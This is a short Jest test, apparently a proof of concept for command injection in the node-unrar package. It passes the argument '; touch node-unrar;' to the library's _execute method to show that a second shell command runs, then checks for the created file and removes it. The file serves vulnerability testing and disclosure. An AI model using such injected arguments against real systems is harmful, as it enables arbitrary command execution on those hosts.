test("Remote code execution in node-unrar", (done) => {
  expect.assertions(2);
  const Unrar = require("node-unrar");
  const fs = require("fs");
  const path = "./node-unrar";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    var rar = new Unrar("/path/to/file.rar");
    rar._execute([], "; touch node-unrar;", function () {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    });
  } catch (error) {}
});
